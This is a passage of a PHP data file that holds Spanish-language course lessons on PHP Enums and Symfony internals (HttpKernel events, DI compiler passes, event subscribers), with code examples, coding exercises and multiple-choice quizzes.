                    'explanation' => 'Los Backed Enums permiten centralizar las transiciones de estado del dominio sin ensuciar la entidad con lógica dispersa. La expresión match garantiza una verificación estricta y exhaustiva en el Zend Engine.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Enums y Máquinas de Estado en PHP',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la diferencia entre un Pure Enum y un Backed Enum en PHP 8.1+?',
                            'options' => [
                                'a' => 'Los Pure Enums solo funcionan en modo CLI y los Backed Enums en la web.',
                                'b' => 'Los Pure Enums son casos tipados sin valor escalar subyacente; los Backed Enums tienen un valor primitivo asignado (string o int) para serialización y persistencia en base de datos.',
                                'c' => 'Los Backed Enums no pueden tener métodos.',
                                'd' => 'Los Pure Enums requieren Composer para ejecutarse.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Un Pure Enum (enum Suit { case Hearts; }) no tiene valor escalar. Un Backed Enum (enum Suit: string { case Hearts = \'H\'; }) tiene un valor string o int asociado, permitiendo métodos como Suit::from(\'H\').',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Qué sucede si evalúas un Enum con una expresión match que no cubre todos los casos y no tiene default?',
                            'options' => [
                                'a' => 'PHP retorna null silenciosamente.',
                                'b' => 'El Zend Engine lanza un UnhandledMatchError inmediato en tiempo de ejecución.',
                                'c' => 'Se produce un warning pero la ejecución continúa.',
                                'd' => 'El servidor PHP-FPM se reinicia por completo.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'match realiza verificación de exhaustividad. Si ningún caso coincide y no se proporciona un default, PHP lanza un UnhandledMatchError, asegurando que los desarrolladores no olviden contemplar nuevos estados.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué ventaja tiene tryFrom() sobre from() en Backed Enums?',
                            'options' => [
                                'a' => 'tryFrom() es más rápido porque no usa memoria zval.',
                                'b' => 'tryFrom() retorna null si el valor escalar no corresponde a ningún caso, mientras que from() lanza un ValueError fatal.',
                                'c' => 'tryFrom() permite crear nuevos casos en tiempo de ejecución.',
                                'd' => 'tryFrom() solo funciona con enteros.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'tryFrom() es seguro para procesar datos no confiables (ej. inputs de usuarios o payloads JSON externos) ya que retorna null en lugar de abortar con una excepción no capturada.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 3: SYMFONY FRAMEWORK INTERNALS
            // LECCIÓN 1: HttpKernel: El Ciclo de Vida Real
            // ==========================================
            'symfony-http-kernel-lifecycle' => [
                'slug' => 'symfony-http-kernel-lifecycle',
                'title' => 'HttpKernel: El Ciclo de Vida Real',
                'module' => 'Symfony Framework',
                'minutes' => 60,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'El núcleo arquitectónico de Symfony no es un monolito rígido, sino una biblioteca canónica llamada HttpKernel. Su misión exclusiva es transformar una Request HTTP inmutable en una Response HTTP conforme a los estándares RFC mediante HttpKernel::handle(Request $request): Response. Todo el framework opera como un pipeline ordenado de 8 eventos secuenciales alrededor de esta firma.',
                    'problem' => 'Los desarrolladores Junior suelen tratar al framework como "magia negra". Al desconocer el flujo exacto de eventos del Kernel, ubican autenticaciones manuales en cada controlador, manipulan cabeceras con header() nativo de PHP, construyen middlewares artesanales frágiles o no comprenden cuándo capturar excepciones, provocando fugas de seguridad, código duplicado y respuestas HTTP malformadas.',
                    'solution' => 'Dominar los 8 eventos secuenciales del HttpKernel: kernel.request, kernel.controller, kernel.controller_arguments, kernel.view, kernel.response, kernel.finish_request, kernel.terminate y kernel.exception. Un Senior sabe con precisión quirúrgica en cuál de estos 8 eventos intervenir para implementar rate limiting, seguridad, serialización o tareas asíncronas en segundo plano.',
                    'problem_label' => 'El Antipatrón de la "Magia Negra" y Lógica en Controladores:',
                    'solution_label' => 'La Solución: El Pipeline Canónico de Eventos del HttpKernel:',
                ],
                'internals' => [
                    'title' => 'Los 8 Eventos Secuenciales del HttpKernel',
                    'steps' => [
                        [
                            'phase' => '1. kernel.request & RouterListener',
                            'description' => 'Primer evento emitido tras crear la Request. Se ejecutan el RouterListener (hace matching de la URL contra la tabla de rutas compilada y añade los atributos _controller y parámetros al Request) y el Security Firewall (autentica credenciales y tokens JWT). Si un listener retorna una Response aquí, el pipeline se cortocircuita y salta directo a kernel.response.',
                        ],
                        [
                            'phase' => '2. kernel.controller & kernel.controller_arguments',
                            'description' => 'El ControllerResolver encuentra el callable PHP correspondiente. Luego, el ArgumentResolver ejecuta los Value Resolvers para transformar parámetros del Request (ej. EntityValueResolver para hidratar entidades por UUID) en los argumentos tipados exactos requeridos por la firma del método.',
                        ],
                        [
                            'phase' => '3. Ejecución del Controlador & kernel.view',
                            'description' => 'Se ejecuta la acción del controlador. Si retorna una Response, el flujo avanza a kernel.response. Si el controlador devuelve un objeto de dominio, entidad o DTO (no Response), se dispara kernel.view para que listeners (ej. SerializerListener) lo transformen en JSON o HTML.',
                        ],
                        [
                            'phase' => '4. kernel.response, finish_request & terminate',
                            'description' => 'kernel.response permite mutar o agregar cabeceras HTTP (CORS, CSP, Cache-Control, ETag). kernel.finish_request limpia el estado del sub-request. Se envían los bytes al socket TCP ($response->send()), y finalmente kernel.terminate ejecuta tareas pesadas en segundo plano (Symfony Messenger, logs) sin hacer esperar al cliente.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/EventListener/ApiRateLimitListener.php',
                    'title' => 'Kernel Request Listener para Rate Limiting con HTTP 429',
                    'tag' => 'Symfony HttpKernel Listener',
                    'code' => "declare(strict_types=1);

namespace App\EventListener;

use Symfony\Component\EventDispatcher\EventSubscriberInterface;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Event\RequestEvent;
use Symfony\Component\HttpKernel\Event\ResponseEvent;
use Symfony\Component\HttpKernel\KernelEvents;

class ApiRateLimitListener implements EventSubscriberInterface
{
    private const MAX_REQUESTS_PER_MINUTE = 60;

    public static function getSubscribedEvents(): array
    {
        return [
            KernelEvents::REQUEST => ['onKernelRequest', 30],
            KernelEvents::RESPONSE => ['onKernelResponse', 0],
        ];
    }

    public function onKernelRequest(RequestEvent \$event): void
    {
        if (!\$event->isMainRequest()) {
            return;
        }

        \$request = \$event->getRequest();
        if (!str_starts_with(\$request->getPathInfo(), '/api/')) {
            return;
        }

        \$clientIp = \$request->getClientIp() ?? '127.0.0.1';
        \$currentUsage = \$this->getUsageForIp(\$clientIp);

        if (\$currentUsage >= self::MAX_REQUESTS_PER_MINUTE) {
            // Cortocircuito temprano: no se llega a ejecutar el controlador
            \$response = new JsonResponse([
                'error' => 'Too Many Requests',
                'message' => 'Límite de peticiones excedido. Intenta de nuevo en 60 segundos.',
            ], Response::HTTP_TOO_MANY_REQUESTS, [
                'Retry-After' => '60',
                'X-RateLimit-Limit' => (string) self::MAX_REQUESTS_PER_MINUTE,
                'X-RateLimit-Remaining' => '0',
            ]);

            \$event->setResponse(\$response);
        }
    }

    public function onKernelResponse(ResponseEvent \$event): void
    {
        if (!\$event->isMainRequest()) {
            return;
        }

        \$event->getResponse()->headers->set('X-RateLimit-Limit', (string) self::MAX_REQUESTS_PER_MINUTE);
    }

    private function getUsageForIp(string \$ip): int
    {
        return 5; // Simulación: en producción lee de Redis en O(1)
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior nunca coloca lógica repetitiva ni cross-cutting (autenticación, rate limiting, logging de auditoría, compresión) dentro de los controladores. Se pregunta: ¿En qué punto exacto del pipeline del HttpKernel debe ocurrir esto? Si es rate limiting, debe ejecutarse en kernel.request ANTES de que el ArgumentResolver haga consultas SQL para hidratar entidades, ahorrando ciclos de CPU y conexiones a MySQL.',
                    'critical_questions' => [
                        '¿Este requerimiento es transversal (Cross-Cutting Concern) que debería desacoplarse en un Kernel Event Subscriber?',
                        '¿Estamos retornando una Response anticipada en kernel.request para evitar el costo de ejecutar el controlador cuando la petición es inválida?',
                        '¿Podemos diferir esta tarea pesada al evento kernel.terminate para liberar la conexión HTTP del usuario de inmediato?',
                        '¿Cómo interactúa este listener con sub-peticiones (HttpKernelInterface::SUB_REQUEST) generadas por Twig render() o fragment rendering?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Implementar verificación de tokens de API y auditoría de tiempos de respuesta en milisegundos para todos los endpoints de una API REST.',
                    'junior' => [
                        'approach' => 'Crea un BaseApiController que heredan todos los controladores. En cada método hace if (!$this->checkToken($request)) y mide el tiempo llamando a microtime(true) al inicio y al final de cada acción en decenas de controladores.',
                        'flaws' => [
                            'Acoplamiento por herencia: viola composición sobre herencia.',
                            'Si se añade un nuevo controlador que olvida heredar de BaseApiController, el endpoint queda expuesto sin seguridad.',
                            'El tiempo de respuesta calculado no incluye el routing, el deserializado del body ni el envío de red de Symfony.',
                            'Duplicación de código masiva y cero reusabilidad.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Implementa un KernelEventSubscriber que escucha kernel.request (prioridad 32 para correr antes de controllers y validar el token; si falla retorna JsonResponse 401 cancelando la cadena) y kernel.response (calcula la diferencia con REQUEST_TIME_FLOAT e inyecta X-Response-Time: 12ms).',
                        'rationale' => [
                            '100% desacoplado de los controladores: los controllers permanecen limpios y enfocados en su caso de uso de negocio.',
                            'Imposible de olvidar o evadir: cualquier ruta registrada en el kernel pasa obligatoriamente por el pipeline.',
                            'Mide con exactitud el ciclo de vida completo de la petición HTTP.',
                        ],
                        'trade_offs' => 'Requiere conocer el sistema de prioridades numéricas de eventos de Symfony para ubicarse antes o después de listeners nativos.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Kernel Event Subscriber para Inyección de Cabeceras de Seguridad',
                    'objective' => 'Implementar un Event Subscriber en Symfony que capture el evento kernel.response e inyecte cabeceras de seguridad estrictas (X-Frame-Options: DENY, X-Content-Type-Options: nosniff).',
                    'instructions' => 'Implementa la clase SecurityHeadersSubscriber implementando EventSubscriberInterface, suscribiendo KernelEvents::RESPONSE y seteando las cabeceras requeridas en el objeto Response.',
                    'filename' => 'SecurityHeadersSubscriber.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\nuse Symfony\\Component\\HttpKernel\\Event\\ResponseEvent;\nuse Symfony\\Component\\HttpKernel\\KernelEvents;\n\nclass SecurityHeadersSubscriber implements EventSubscriberInterface\n{\n    public static function getSubscribedEvents(): array\n    {\n        // TODO: Suscribir el evento KernelEvents::RESPONSE\n        return [];\n    }\n\n    public function onKernelResponse(ResponseEvent \$event): void\n    {\n        // TODO: Obtener la Response e inyectar X-Frame-Options: DENY y X-Content-Type-Options: nosniff\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\nuse Symfony\\Component\\HttpKernel\\Event\\ResponseEvent;\nuse Symfony\\Component\\HttpKernel\\KernelEvents;\n\nclass SecurityHeadersSubscriber implements EventSubscriberInterface\n{\n    public static function getSubscribedEvents(): array\n    {\n        return [\n            KernelEvents::RESPONSE => 'onKernelResponse',\n        ];\n    }\n\n    public function onKernelResponse(ResponseEvent \$event): void\n    {\n        \$response = \$event->getResponse();\n        \$response->headers->set('X-Frame-Options', 'DENY');\n        \$response->headers->set('X-Content-Type-Options', 'nosniff');\n    }\n}\n",
                    'explanation' => 'Un EventSubscriber en Symfony centraliza las mutaciones de cabeceras HTTP en un único punto del ciclo de vida. Al escuchar KernelEvents::RESPONSE, garantizamos que todas las respuestas emitidas por el sistema incluyan defensas activas contra Clickjacking (X-Frame-Options) y MIME-confusion attacks (X-Content-Type-Options).',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Internals del HttpKernel de Symfony',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué ocurre en el pipeline del HttpKernel si un listener del evento kernel.request ejecuta `$event->setResponse($response)`?',
                            'options' => [
                                'a' => 'PHP lanza una excepción fatal porque solo los controladores pueden devolver respuestas.',
                                'b' => 'El Kernel salta de inmediato al evento kernel.response y omite la ejecución del controlador, optimizando recursos.',
                                'c' => 'La respuesta se ignora hasta que termine el controlador.',
                                'd' => 'Se reinicia el servidor web Nginx.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Cuando un listener de kernel.request establece una Response (ej. autenticación fallida o cache hit), el HttpKernel cortocircuita el pipeline y avanza directamente a kernel.response, sin ejecutar el controlador ni los resolvers de argumentos.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es la diferencia fundamental entre el evento `kernel.response` y el evento `kernel.terminate`?',
                            'options' => [
                                'a' => 'kernel.response solo se ejecuta en modo debug.',
                                'b' => 'kernel.response ocurre ANTES de enviar los bytes al cliente (para modificar headers/cookies); kernel.terminate ocurre DESPUÉS de que la respuesta fue enviada al socket TCP (para tareas pesadas en segundo plano).',
                                'c' => 'kernel.terminate destruye la base de datos.',
                                'd' => 'No hay ninguna diferencia; son sinónimos.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'kernel.terminate se ejecuta tras $response->send() (cuando fastcgi_finish_request() ya cerró la conexión HTTP con el cliente), permitiendo ejecutar tareas pesadas de limpieza o despacho asíncrono sin demorar al usuario.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Por qué es crítico verificar `$event->isMainRequest()` en listeners de eventos del HttpKernel?',
                            'options' => [
                                'a' => 'Porque evita que el listener se ejecute múltiples veces en sub-peticiones internas (ej. renderizado de fragmentos en Twig o renders embebidos).',
                                'b' => 'Porque sin esa llamada el código no compila en PHP 8.4.',
                                'c' => 'Para saber si el usuario está logueado como administrador.',
                                'd' => 'Para forzar una conexión HTTPS.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Symfony permite anidar sub-peticiones (ej. fragmentos de Twig). Si un listener de seguridad o rate limit no verifica isMainRequest(), podría evaluar y bloquear llamadas internas innecesariamente.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 3: LECCIÓN 2: DI Container & Compiler Passes
            // ==========================================
            'symfony-service-container' => [
                'slug' => 'symfony-service-container',
                'title' => 'DI Container & Compiler Passes',
                'module' => 'Symfony Framework',
                'minutes' => 55,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'El Dependency Injection Container (DIC) de Symfony es un compilador estático de grafos de dependencias. A diferencia de otros frameworks que resuelven servicios mediante reflexión lenta en cada petición HTTP, Symfony compila el grafo completo de servicios durante el calentamiento de caché (cache:warmup), produciendo código PHP nativo plano, altamente optimizado para OpCache y con cero sobrecosto de reflexión en producción.',
                    'problem' => 'El antipatrón "Service Locator": inyectar el contenedor completo ($container->get("my_service")) o heredar de clases abstractas que ocultan dependencias. Esto ofusca las dependencias reales de las clases, imposibilita el análisis estático riguroso con PHPStan, destruye la capacidad de testing unitario y genera fallos catastróficos en producción al solicitar servicios privados eliminados.',
                    'solution' => 'Inyección estricta por constructor (Constructor Injection), autowiring tipado, atributos nativos de PHP 8 (#[Autowire], #[TaggedIterator], #[AsDecorator]) y manipulación del contenedor en tiempo de compilación mediante CompilerPasses (CompilerPassInterface) para procesar servicios etiquetados sin degradar el rendimiento.',
                    'problem_label' => 'El Antipatrón Service Locator y Dependencias Ocultas:',
                    'solution_label' => 'La Solución: Contenedor Compilado y Constructor Injection:',
                ],
                'internals' => [
                    'title' => 'Cómo Compila Symfony el Grafo de Dependencias',
                    'steps' => [
                        [
                            'phase' => '1. Definiciones de Servicios (Definition & Reference)',
                            'description' => 'Durante la carga de configuración, Symfony no instancia objetos reales. Crea instancias de Definition. Cada servicio es un nodo en un grafo que describe cómo se construirá, sus argumentos y sus tags.',
                        ],
                        [
                            'phase' => '2. Fase de Compiler Passes',
                            'description' => 'Antes de volcar el contenedor a disco, Symfony ejecuta los CompilerPasses. Aquí se resuelven tags: por ejemplo, buscar todos los servicios con tag app.export_driver y recopilar sus referencias para inyectarlas en un ExportManager.',
                        ],
                        [
                            'phase' => '3. Detección de Ciclos y Optimización de Inlining',
                            'description' => 'El compilador detecta dependencias circulares (Servicio A requiere B, y B requiere A). Si un servicio privado solo se utiliza una vez en todo el sistema, Symfony lo "incrusta" (inlines) directamente dentro del constructor del consumidor, eliminando métodos auxiliares.',
                        ],
                        [
                            'phase' => '4. Generación de Código Nativo en var/cache/',
                            'description' => 'El resultado final es una clase PHP plana (App_KernelDevContainer.php) con instanciaciones new MyService(...). En producción, OpCache precarga este archivo en memoria compartida (SHM), logrando una velocidad de instanciación prácticamente instantánea.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/DependencyInjection/Compiler/PaymentGatewayPass.php',
                    'title' => 'Compiler Pass para Registro Automático de Pasarelas Etiquetadas',
                    'tag' => 'Symfony DI Compiler Pass',
                    'code' => "declare(strict_types=1);

namespace App\DependencyInjection\Compiler;

use App\Payment\PaymentRegistry;
use Symfony\Component\DependencyInjection\Compiler\CompilerPassInterface;
use Symfony\Component\DependencyInjection\ContainerBuilder;
use Symfony\Component\DependencyInjection\Reference;

class PaymentGatewayPass implements CompilerPassInterface
{
    public function process(ContainerBuilder \$container): void
    {
        // Si el servicio central de registro no existe en el contenedor, no hace nada
        if (!\$container->has(PaymentRegistry::class)) {
            return;
        }

        \$registryDefinition = \$container->findDefinition(PaymentRegistry::class);
        \$taggedServices = \$container->findTaggedServiceIds('app.payment_gateway');

        foreach (\$taggedServices as \$serviceId => \$tags) {
            // Añade cada pasarela descubierta al método registerGateway() del registro
            \$registryDefinition->addMethodCall('registerGateway', [new Reference(\$serviceId)]);
        }
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior sabe que todo lo que pueda resolverse en tiempo de compilación NO debe ejecutarse en tiempo de petición (Runtime). Si un sistema necesita descubrir 10 procesadores de pago o 20 exportadores de reportes, un desarrollador inexperto recorre carpetas con glob() o hace scandir() en cada petición HTTP. Un Senior crea un tag y usa #[TaggedIterator] o un CompilerPass: el descubrimiento ocurre una sola vez en el build de despliegue (cache:warmup) y en producción la colección ya viene inyectada en 0 milisegundos.',
                    'critical_questions' => [
                        '¿Estamos usando Service Locator ($this->container->get()) en lugar de inyectar dependencias explícitas en el constructor?',
                        '¿Podemos resolver este descubrimiento dinámico usando #[TaggedIterator] o un CompilerPass para evitar lecturas de disco en runtime?',
                        '¿Nuestros servicios son privados por defecto para permitir que el compilador los optimice e incruste (inline)?',
                        '¿Estamos usando #[Autowire] para inyectar parámetros de configuración (%kernel.project_dir%, variables de entorno) de forma tipada?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Implementar un sistema de notificaciones multicanal (Email, SMS, WhatsApp, Slack) donde se puedan agregar nuevos canales sin modificar el servicio de envío.',
                    'junior' => [
                        'approach' => 'Crea NotificationManager que recibe el ContainerInterface completo. En el método send($channel, $message) hace un switch ($channel) con $service = match($channel) { "email" => $this->container->get("app.email_notifier"), ... }; $service->send($message);.',
                        'flaws' => [
                            'Viola Open/Closed: cada nuevo canal requiere modificar el switch central.',
                            'Antipatrón Service Locator: exige que los servicios sean públicos en el contenedor, desactivando optimizaciones del compilador.',
                            'Si hay un error tipográfico en el string ("emails" en vez de "email"), colapsa en tiempo de ejecución en producción.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Crea NotifierInterface con supports(string $channel): bool y send(string $recipient, string $message): bool. En NotificationManager inyecta una colección tipada iterable<NotifierInterface> mediante #[TaggedIterator("app.notifier")]. Itera los colaboradores y delega.',
                        'rationale' => [
                            '100% extensible: agregar un canal nuevo solo requiere crear la clase con la interfaz y Symfony la inyecta automáticamente.',
                            'Cero Service Locator: todas las dependencias son privadas y tipadas.',
                            'Compilación estática verificada durante el build de CI/CD.',
                        ],
                        'trade_offs' => 'Requiere comprender la semántica de iterables y tagged services de Symfony.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Gestor de Notificaciones mediante Tagged Services',
                    'objective' => 'Implementar un NotificationManager que reciba una colección de NotifierInterface mediante inyección por constructor y despache mensajes según el canal soportado.',
                    'instructions' => 'Define NotifierInterface con métodos supports(string $channel): bool y send(string $recipient, string $message): bool, e implementa NotificationManager recibiendo iterable $notifiers en el constructor con el método dispatch(string $channel, string $recipient, string $message): bool sin usar Service Locator.',
                    'filename' => 'NotificationManager.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\n// TODO 1: Definir NotifierInterface con supports(string \$channel): bool y send(string \$recipient, string \$message): bool\n\n// TODO 2: Implementar NotificationManager recibiendo iterable \$notifiers en el constructor\n// con el método dispatch(string \$channel, string \$recipient, string \$message): bool\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\ninterface NotifierInterface\n{\n    public function supports(string \$channel): bool;\n    public function send(string \$recipient, string \$message): bool;\n}\n\nreadonly class NotificationManager\n{\n    /**\n     * @param iterable<NotifierInterface> \$notifiers\n     */\n    public function __construct(\n        private iterable \$notifiers\n    ) {}\n\n    public function dispatch(string \$channel, string \$recipient, string \$message): bool\n    {\n        foreach (\$this->notifiers as \$notifier) {\n            if (\$notifier->supports(\$channel)) {\n                return \$notifier->send(\$recipient, \$message);\n            }\n        }\n\n        return false;\n    }\n}\n",
                    'explanation' => 'Al inyectar una colección de NotifierInterface por constructor mediante tagged iterator, NotificationManager cumple rigurosamente con el principio Open/Closed y la Inversión de Dependencias (DIP). Se erradica por completo el antipatrón Service Locator.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Contenedor DI y Compilación en Symfony',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué inyectar el contenedor completo ($container) en un servicio es considerado un antipatrón en arquitectura Senior?',
                            'options' => [
                                'a' => 'Porque ralentiza el motor de base de datos MySQL.',
                                'b' => 'Antipatrón Service Locator: oculta las dependencias reales de la clase, impide que PHPStan detecte errores de tipado y requiere servicios públicos innecesarios.',
                                'c' => 'Porque Symfony 7 no permite compilar contenedores.',
                                'd' => 'Porque el contenedor solo puede almacenar cadenas de texto.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'El antipatrón Service Locator disfraza las dependencias de una clase como si no necesitara nada en el constructor, dificultando las pruebas unitarias y deshabilitando la detección temprana de errores estáticos.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿En qué fase del ciclo de vida del contenedor se ejecutan las clases que implementan `CompilerPassInterface`?',
                            'options' => [
                                'a' => 'En cada petición HTTP cuando el usuario ingresa al sitio.',
                                'b' => 'Únicamente durante la compilación del contenedor (ej. en cache:warmup o al primer arranque), antes de volcar el contenedor optimizado a disco.',
                                'c' => 'Durante el cierre de la conexión de base de datos.',
                                'd' => 'En el navegador web mediante JavaScript.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Los CompilerPasses operan en tiempo de compilación. Manipulan las definiciones de servicios (Definition) antes de que el contenedor se escriba en disco como código PHP plano, garantizando cero sobrecosto en tiempo de ejecución.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué beneficio ofrece declarar los servicios como privados por defecto (`default: { public: false }`) en Symfony?',
                            'options' => [
                                'a' => 'Permite al compilador optimizar, eliminar servicios no utilizados e incrustar (inline) servicios de un solo uso directamente en sus consumidores.',
                                'b' => 'Impide que los usuarios puedan ver el código fuente en GitHub.',
                                'c' => 'Hace que los servicios se ejecuten en un servidor Apache separado.',
                                'd' => 'Obliga a que todos los métodos sean estáticos.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Al saber que un servicio es privado, el compilador de Symfony puede eliminarlo si nadie lo usa, o incrustar su inicialización dentro de otro servicio sin crear métodos getters adicionales en el contenedor.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 3: LECCIÓN 3: Event Dispatcher & Subscriptions
            // ==========================================
            'symfony-event-dispatcher' => [
                'slug' => 'symfony-event-dispatcher',
                'title' => 'Event Dispatcher & Subscriptions',
                'module' => 'Symfony Framework',
                'minutes' => 40,
                'difficulty' => 'Avanzado',
                'overview' => [
                    'concept' => 'El patrón Observer es la columna vertebral del desacoplamiento en Symfony. El componente EventDispatcher provee un mediador síncrono donde los objetos emiten eventos tipados anunciando que una acción de dominio o del framework ocurrió, permitiendo que otros servicios escuchen y reaccionen sin conocer al emisor original.',
                    'problem' => 'La confusión crónica entre EventListener y EventSubscriber, el desconocimiento de las prioridades de ejecución y la pésima práctica de despachar tareas pesadas bloqueantes (enviar correos electrónicos con SMTP, generar PDFs, peticiones a APIs externas) dentro de eventos síncronos de peticiones web, aumentando la latencia del usuario de 40ms a más de 3 segundos.',
                    'solution' => 'Usar EventSubscriberInterface (la propia clase declara los eventos que escucha y sus prioridades en código PHP tipado en lugar de archivos YAML externos), controlar la propagación con $event->stopPropagation() cuando sea estrictamente necesario, y distinguir eventos síncronos del HttpKernel de mensajes asíncronos para Symfony Messenger.',
                    'problem_label' => 'El Antipatrón de Tareas Bloqueantes en Eventos Síncronos:',
                    'solution_label' => 'La Solución: Event Subscribers Tipados y Desacoplamiento:',
                ],
                'internals' => [
                    'title' => 'Mecánica del Event Dispatcher: Subscripciones y Prioridades',
                    'steps' => [
                        [
                            'phase' => '1. EventListener vs EventSubscriber',
                            'description' => 'Un Listener es una clase que requiere configuración externa en servicios.yaml. Un Subscriber implementa EventSubscriberInterface y contiene el método estático getSubscribedEvents(): array, autoconfigurándose sin configuración externa y facilitando refactors con IDEs.',
                        ],
                        [
                            'phase' => '2. El Algoritmo de Ordenamiento por Prioridad',
                            'description' => 'Los listeners se ordenan internamente en un array asociativo indexado por prioridad (números enteros de -2048 a +2048, por defecto 0). A mayor número, más pronto se ejecuta. Si dos listeners tienen la misma prioridad, se ejecutan en el orden en que fueron registrados.',
                        ],
                        [
                            'phase' => '3. Detención de Propagación (stopPropagation)',
                            'description' => 'Si un listener llama a $event->stopPropagation(), el EventDispatcher interrumpe el bucle de despacho inmediatamente. Ningún listener posterior recibe el evento. Esto se usa en filtros de seguridad o cortocircuitos de flujo.',
                        ],
                        [
                            'phase' => '4. La Frontera con Symfony Messenger',
                            'description' => 'Un Event Dispatcher es estrictamente síncrono y en el mismo hilo de ejecución. Si la acción resultante del evento tarda más de 20ms (ej. enviar email o webhook), el suscriptor debe limitarse a despachar un mensaje asíncrono a Symfony Messenger para ejecución en segundo plano.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/EventSubscriber/UserAuditSubscriber.php',
                    'title' => 'Event Subscriber con Prioridades y Auditoría de Seguridad',
                    'tag' => 'Symfony EventSubscriberInterface',
                    'code' => "declare(strict_types=1);

namespace App\EventSubscriber;

use App\Event\UserRegisteredEvent;
use Psr\Log\LoggerInterface;
use Symfony\Component\EventDispatcher\EventSubscriberInterface;

class UserAuditSubscriber implements EventSubscriberInterface
{
    public function __construct(
        private readonly LoggerInterface \$logger
    ) {}

    public static function getSubscribedEvents(): array
    {
        return [
            UserRegisteredEvent::class => [
                ['auditRegistration', 100],      // Prioridad alta: auditoría inmediata
                ['dispatchWelcomeSequence', 0], // Prioridad estándar: encolar bienvenida
            ],
        ];
    }

    public function auditRegistration(UserRegisteredEvent \$event): void
    {
        \$this->logger->info('Auditoría de seguridad: Nuevo usuario registrado', [
            'userId' => \$event->userId,
            'email' => \$event->email,
            'ip' => \$event->clientIp,
        ]);
    }

    public function dispatchWelcomeSequence(UserRegisteredEvent \$event): void
    {
        // Delegar a cola asíncrona de Symfony Messenger
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior nunca acopla lógica secundaria al flujo principal. Cuando un usuario se registra, el servicio register() no debe saber que existe SendGrid, Mailchimp, Slack o Mixpanel. La entidad emite UserRegisteredEvent. Si mañana marketing quiere registrar el lead en Salesforce, solo se agrega un nuevo SalesforceSubscriber sin tocar ni un punto del código de registro original.',
                    'critical_questions' => [
                        '¿Este evento debe ejecutarse de forma síncrona dentro de la transacción de base de datos o debe ser asíncrono en segundo plano?',
                        '¿Estamos usando EventSubscriber en lugar de Listener para que la subscripción esté co-localizada con la lógica en código PHP?',
                        '¿La prioridad asignada a este suscriptor entra en conflicto con los listeners del core de Symfony?',
                        '¿Qué pasa si uno de los suscriptores arroja una excepción no controlada? ¿Debe revertirse la operación o registrarse el error en logs?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Al confirmar un pedido en una tienda online, se debe actualizar inventario, generar factura PDF, notificar por email al cliente y registrar analíticas.',
                    'junior' => [
                        'approach' => 'Escribe las 4 operaciones en el servicio OrderCheckoutService una tras otra de forma imperativa dentro del mismo método síncrono.',
                        'flaws' => [
                            'Si falla la generación del PDF, el pedido no se confirma y la transacción se aborta aunque el cobro bancario ya ocurrió.',
                            'El tiempo de respuesta al cliente supera los 3.5 segundos.',
                            'Viola el principio de Responsabilidad Única (SRP) de forma flagrante.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'OrderCheckoutService confirma el pedido y despacha OrderPlacedEvent. Un suscriptor síncrono de inventario bloquea el stock. Los suscriptores de PDF, email y analíticas despachan mensajes asíncronos a Symfony Messenger (colas Redis). El usuario recibe respuesta en 40ms.',
                        'rationale' => [
                            'Resiliencia de fallos: si el servidor de email se cae, la orden sigue creada con éxito y el worker de email reintenta automáticamente.',
                            'Latencia web mínima (< 50ms).',
                            'Alta cohesión y bajo acoplamiento.',
                        ],
                        'trade_offs' => 'Introduce consistencia eventual (Eventual Consistency) para el email y PDF, requiriendo supervisar workers de colas.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Event Subscriber con Prioridades Múltiples',
